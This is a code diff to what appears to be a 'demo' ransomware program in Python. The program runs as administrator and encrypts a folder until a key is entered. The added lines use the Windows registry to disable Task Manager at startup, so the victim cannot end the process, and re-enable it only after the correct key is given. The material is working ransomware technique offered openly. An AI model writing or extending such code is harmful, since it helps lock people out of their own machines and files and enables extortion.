@@ -112,7 +112,8 @@ def ransomware_prompt():
         if entry.get() == DEMO_KEY:
             messagebox.showinfo("Unlocked", "Correct key! Demo ended.")
             decrypt_folder(FOLDER_PATH, load_key())
-            
+            # Re-enable Task Manager
+            os.system('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /f')
             window.destroy()
             exit(0)  # Exit the program
         else:
@@ -128,7 +129,10 @@ def ransomware_prompt():
 
 if __name__ == "__main__":
     run_as_admin()
-    
+
+    # Disable Task Manager
+    os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')
+
     while not os.path.exists(KEY_FILE):
         generate_key()
     encrypt_folder(FOLDER_PATH, load_key())
